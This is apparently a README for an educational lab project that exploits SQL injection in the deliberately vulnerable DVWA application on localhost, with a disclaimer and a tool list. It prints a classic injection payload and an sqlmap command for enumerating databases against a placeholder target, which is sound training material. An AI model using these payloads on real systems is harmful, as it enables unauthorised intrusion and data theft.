# SQL Injection Lab Project (DVWA)

## 📌 Overview
This project demonstrates the exploitation of an SQL Injection vulnerability in the **Damn Vulnerable Web Application (DVWA)** in a controlled lab environment.
The objective of this project is to identify and exploit input validation weaknesses, retrieve simulated data, and provide remediation recommendations.

---

## ⚠️ Disclaimer
This project was conducted **only** in a safe, isolated lab environment for **educational purposes**.  
Do not attempt these techniques on any system without **explicit permission**.

---

## 🛠 Tools & Environment
- **Attacker Machine:** Kali Linux
- **Target Application:** DVWA (Damn Vulnerable Web Application)
- **Tools Used:** Burp Suite, SQLmap
- **Environment:** Localhost (XAMPP / Apache + MySQL)

---

## 🔍 Vulnerability Description
- **Name:** SQL Injection
- **Type:** Injection Attack
- **Impact:** Allows execution of arbitrary SQL queries against the database.
- **CVE Reference:** [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## ⚙️ Steps to Exploit
### 1️⃣ Setup DVWA
1. Install XAMPP or use Docker for DVWA.
2. Configure DVWA security level to "Low".
3. Ensure database connection is running.

### 2️⃣ Manual Testing
- Injected payloads such as:
```
' OR '1'='1 --
```
into vulnerable form fields.

### 3️⃣ Automated Testing
- Used **SQLmap** to confirm vulnerability and extract data:
```bash
sqlmap -u "http://<target-ip>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxxx; security=low" --dbs
```

### 4️⃣ Data Extraction
- Retrieved simulated user data from DVWA database.

---
